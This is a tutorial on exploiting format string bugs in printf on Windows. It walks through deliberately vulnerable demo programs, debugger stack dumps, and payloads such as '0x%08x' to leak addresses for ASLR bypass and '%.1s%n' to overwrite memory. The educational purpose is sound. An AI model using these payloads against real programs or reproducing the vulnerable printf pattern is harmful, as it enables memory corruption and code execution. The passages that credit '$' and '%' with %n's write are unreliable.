# Format String Vulnerability

## Background

Format string vulnerability is usually a stack-based memory corruption. The easiest way to explain about the problem is that basically the attacker is able to take advantage of the calling convention by controlling the format argument for the **printf family**, thus manipulating the memory. If successful, the attacker may be able to read, write, or gain arbitrary code execution in memory.

The printf family includes: fprintf, printf, sprintf, snprintf, vfprintf, vprintf, vsprintf, and vsnprintf.

Keep in mind that exploiting a format string bug on Windows is slightly different than Linux. For example, you can't actually use the `$` operator to read from memory at a specific position, but you can do this on Linux.

## How printf() Works

The `printf()` function is for printing characters on the screen, and can be used in two different ways. Either you want to print something on the screen like this:

```c
printf("Hello World\n");
```

Or you format the string like this:

```c
printf("%s\n", "Hello World");
```

The difference is that the first example puts the string in the format argument, and the second one uses a format specifier of `%s` to explicitly treat the phrase `Hello World` as a string.

There are other specifiers supported by the printf family:

| Specifier | Output                                                       |
| --------- | ------------------------------------------------------------ |
| d or i    | Signed decimal integer                                       |
| u         | Unsigned decimal integer                                     |
| o         | Unsigned octal                                               |
| x         | Unsigned hexadecimal integer (lowercase)                     |
| X         | Unsigned hexadecimal integer (uppercase)                     |
| f         | Decimal floating point (lowercase)                           |
| F         | Decimal floating point (uppercase)                           |
| e         | Scientific notation                                          |
| E         | Scientific notation                                          |
| g         | Use the shortest representation: %e or %f                    |
| G         | Use the shortest representation: %E or %F                    |
| a         | Hexadecimal floating piont                                   |
| A         | Hexadecimal floating point                                   |
| c         | Character                                                    |
| s         | String                                                       |
| p         | Pointer address                                              |
| n         | Number of bytes written (saved in int*). This is disabled by default in Visual Studio. |
| %         | A % followed by another % character will write a single % to th |
| $         | A Posix only operator that can be used to read an argument at a specific position. |

In reverse engineering, `printf` can be seen like the following code:

```
push    offset aHelloWorld ; "Hello World!"
push    offset aS       ; "%s\n"
call    sub_401150
```

At runtime, the stack arragement for `printf` would look like this:

```
012FFDD0   0029B010  |Arg1 = 0029B010 ASCII "%s"
012FFDD4   0029B000  \Arg2 = 0029B000 ASCII "Hello World!"
012FFDD8   012FFE00
012FFDDC   012FFE00
012FFDE0   012FFE00
012FFDE4   0028127F  RETURN to format_s.0028127F from format_s.002851D9
```

The code implies that the `%s` assumes the second argument is a string. However, the second argument for `printf` is actually optional. If it isn't provided, the function will treat whatever is on the stack as the second argument, and that's where things get nasty.

## Reading the Stack

Here we have a very basic example of a format string vulnerability:

```c
printf(argv[1]);
```

In IDA, the code involved would look like this:

```
mov     eax, 4
shl     eax, 0
mov     ecx, [ebp+arg_4] ; Retrieve the pointer to argv
mov     edx, [ecx+eax]   ; Grab the 2nd argument from argv at offset 4
push    edx              ; Push the 2nd argument to printf
call    sub_401080       ; This is printf()
```

At runtime, the stack looks like this before `printf` is executed:

```
0113F75C   00043F73  \Arg1 = 00043F73 ASCII "0x%08x 0x%08x 0x%08x"
0113F760  /0113F7A8
0113F764  |01141270  RETURN to format_s.01141270 from format_s.01141000
```

Notice there is a return value at the 2nd position in the above stack view (0x01141270). For an exploit developer, this information is quite valuable becauses it allows us to do a couple of things:

* Calculating the base address of the image, which is useful for ROP (return-oriented programming). An effective way to bypass DEP and ASLR.
* Fingerprinting the version of the program, which yields a more reliable exploit.

If we want to read the return value, we can tell `printf` to format the stack layout like this:

```
test.exe "0x%08x 0x%08x"
```

And we get the following output when we run the program:

```
0x0113f7a8 0x01141270
```

By using a debugger, we know that the base address in our example is 0x01140000. Leveraging that information, we know that the offset to the return address is **0x1270**. That means, as long as we are able to leak the return address, we can reliably figure out the base address of the image:

```
// The stack at a different run
0x00b4ff3c 0x00a31270 <-- The RETN address leak

// Calculating the base address
0x00a31270 - 0x1270 = A30000

// Debugger tells us we do indeed have the right address
Executable modules, item 0
 Base=00A30000
 Size=0001D000 (118784.)
 Entry=00A312E6 format_s.<ModuleEntryPoint>
 Name=format_s
 Path=C:\Users\sinn3r\Desktop\format_string_leak.exe

```

## Reading from an Arbitrary Location

Reading from an arbitrary location seems to be more rare in an attack, probably because it requires that value to be placed on the stack, and you don't always have direct control of that. However, this isn't completely impossible. For example:

```c
void spray() {
  size_t blockSize = 0x8000;
  for (int i = 0; i < 0x2048; i++) {
    LPVOID h = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, blockSize);
    memset(h, 'A', blockSize);
  }
}

int main(int args, char** argv) {
  spray(); // This writes data to 0x0c0c0c0c
  char buf[1024];
  scanf("%s", buf);
  printf(argv[1]);
  printf("\n");
  system("PAUSE");
  return 0;
}
```

If we want to take advantage of the format string vulnerability to read data from the address 0x0c0c0c0c, we need some kind of routine that places arbitrary data on the stack. The above example uses a `scanf` function to acheive this idea:

**Before scanf()**

```
009DF8A4   00B10000  |Arg1 = 00B10000 ASCII "%s"
009DF8A8   009DF8AC  \Arg2 = 009DF8AC
009DF8AC   00000000
009DF8B0   00000000
009DF8B4   009DFA18
009DF8B8   001B0000
009DF8BC   0000007F
009DF8C0   009DFA18
009DF8C4   774E4D39  RETURN to ntdll.774E4D39 from ntdll.774F8158
```

**After scanf()**

```
009DF8A4   00B10000  ASCII "%s"
009DF8A8   009DF8AC
009DF8AC   0C0C0C0C <--- Our arbitrary data
009DF8B0   00000000
009DF8B4   009DFA18
009DF8B8   001B0000
009DF8BC   0000007F
009DF8C0   009DFA18
009DF8C4   774E4D39  RETURN to ntdll.774E4D39 from ntdll.774F8158
```

If the next function is the vulnerable `printf` statement, then the value 0x0c0c0c0c will become the second argument:

```
009DF8A8   009DF8AC  \Arg1 = 009DF8AC
009DF8AC   0C0C0C0C  ASCII "AAAAAAAAAAAAAAAA..."
```

Because our value becomes the second argument for `printf`, if we supply `%s` as the format string, we end up reading the string at address 0x0c0c0c0c until it hits a null byte terminator:

```
AAAAAAAAAAA...AAAAAAAAA½½½½½½½½
```

The extra bytes at the end comes from the heap block:

```
0C0C0C0C  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0C0C0C1C  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
 ....

0C0C142C  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0C0C143C  41 41 41 41 AB AB AB AB AB AB AB AB 00 00 00 00  AAAA««««««««....
0C0C144C  00 00 00 00 C8 7B 70 3A C6 4D 6C 18 41 41 41 41  ....È{p:ÆMlAAAA
```

## Writing to an Arbitrary Location

Arbitrary-write is a pretty powerful techniqe in exploit development nowadays, and a format string by design makes this much easier to acheive compare to other vulnerability classes.

To be able to write data in memory, the `%` operator can be used to achieve that. The `$` operator allows you to count the number of bytes printed on screen, and save it to a variable you provide. Keep in mind that this formater specifier is [disabled by default](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/set-printf-count-output?view=vs-2017) in Visual Studio, so a working example on Windows would look like this:

```c
int main(int args, char** argv) {
  _set_printf_count_output(1);
  int i;
  printf("AAAA%n\n", &i);
  return 0;
}
```

Every time an A character is printed, the `i` variable is added by one. So by the time the program reaches the `%n` operator, 4 As have been printed, therefore `i` should be 4. Leveraging from this mechnism, it is possible to use `$n` to:

1. Overwrite a RETN address to get arbitrary code execution.
2. Modify a variable.
3. Modify a flag that alters the execution flow.

An example of an arbitrary-write can be demonstrated by the following code:

```cpp
class SomeObject {
public:
  BOOL flag;
  SomeObject() {
    flag = FALSE;
  }
};

int main(int args, char** argv) {
  _set_printf_count_output(1);
  SomeObject* obj = new SomeObject();
  printf(argv[1]);
  if (obj->flag) {
    printf("\nFlag is true\n");
  } else {
    printf("\nFlag is false\n");
  }
  delete(obj);
  obj = NULL;
  return 0;
}
```

The code shows we have an object called `SomeObject`, and there is a property that is set to `FALSE` by default. The main function checks on that flag, looks like should always print "Flag is false". However, we can use the format string bug to alter that execution flow, and make the output print "Flag is true". Let's walk through the code with a debugger to see how that is possible.

Since we're trying to observe how the object is modified, the very first thing we want to do is pay attention to the heap allocation of it by checking the `new` operator:

```assembly
.text:00BE1032                 push    4
.text:00BE1034                 call    sub_BE118F
```

The function call implies our object is 4 bytes, and EAX returns **0x00e085c0**:

```
0:000> g
Breakpoint 1 hit
eax=00000016 ebx=00c6d000 ecx=00be42ef edx=00000038 esi=00bfaea0 edi=00e042f0
eip=00be1034 esp=00b0f808 ebp=00b0f82c iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
f+0x1034:
00be1034 e856010000      call    f+0x118f (00be118f)
0:000> p
eax=00e085c0 ebx=00c6d000 ecx=00000004 edx=40000060 esi=00bfaea0 edi=00e042f0
eip=00be1039 esp=00b0f808 ebp=00b0f82c iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
f+0x1039:
00be1039 83c404          add     esp,4
```

When the object is initialized and ready to go, the memory looks like this:

```assembly
0:000> dd 00e085c0  
00e085c0  00000000 abababab abababab feeefeee
00e085d0  00000000 00000000 801fd33e 0000b105
00e085e0  00e09fe8 00e000c0 feeefeee feeefeee
00e085f0  feeefeee feeefeee feeefeee feeefeee
00e08600  feeefeee feeefeee feeefeee feeefeee
00e08610  feeefeee feeefeee feeefeee feeefeee
00e08620  feeefeee feeefeee feeefeee feeefeee
00e08630  feeefeee feeefeee feeefeee feeefeee
```

Notice the first DWORD, that is where the `flag` value is stored. It is 0.

The next thing that happens is our `printf` routine:

```assembly
.text:00BE1073                 mov     edx, 4
.text:00BE1078                 shl     edx, 0
.text:00BE107B                 mov     eax, [ebp+arg_4]
.text:00BE107E                 mov     ecx, [eax+edx]
.text:00BE1081                 push    ecx
.text:00BE1082                 call    sub_BE1150
```

At runtime, the printf stack looks like this:

```
0:000> r
eax=00e042f0 ebx=00c6d000 ecx=00e0431a edx=00000004 esi=00bfaea0 edi=00e042f0
eip=00be1082 esp=00b0f808 ebp=00b0f82c iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
f+0x1082:
00be1082 e8c9000000      call    f+0x1150 (00be1150)
0:000> dd esp L4
00b0f808  00e0431a 00b0f830 00e085c0 00e085c0
```

The first DWORD (00b0f808) is the first argument of the `printf` function. The most interesting one is the theird DWORD, because that is the address for our `SomeObject` instance. We recall that the first DWORD of the object's address is where the `flag` variable saves its value, that is what we want to control. To acheive that, basically this is what we have to deal with:

| Offset from ESP | Pointer  | Comment                                                      |
| --------------- | -------- | ------------------------------------------------------------ |
| 0               | 00b0f808 | This is a pointer to the format string.                      |
| 4               | 00b0f830 | This is some pointer that could be treated by printf as a second argument. |
| 8               | 00e085c0 | This is the address for the `SomeObject` instance, which could be treated by printf as the third argument. |

In order to overwrite the `flag` variable, we should craft our format string like this:

```
%.1s%n
```

And here's what happens in memory when we do that:

| Offset from ESP | Pointer  | Value                                                        |
| --------------- | -------- | ------------------------------------------------------------ |
| 0               | 00b0f808 | "%.1s%n"                                                     |
| 4               | 00b0f830 | The format specifier `%.1s` prints one byte from this address. |
| 8               | 00e085c0 | The format specifier `%n` counts only one byte is printed on the screen, and then saves that count in this address. |

After `printf` is executed, the value for `flag` ends up being changed by the `%n` format specifier to 1.

```
0:000> dd 00e085c0 
00e085c0  00000001 abababab abababab feeefeee
00e085d0  00000000 00000000 801fd33e 0000b105
00e085e0  00e09fe8 00e000c0 feeefeee feeefeee
00e085f0  feeefeee feeefeee feeefeee feeefeee
00e08600  feeefeee feeefeee feeefeee feeefeee
00e08610  feeefeee feeefeee feeefeee feeefeee
00e08620  feeefeee feeefeee feeefeee feeefeee
00e08630  feeefeee feeefeee feeefeee feeefeee
```

That means when the main function checks for the `flag` variable, it will no longer print "false" as we previously expected, instead it should be the opposite:

```
å
Flag is true
```







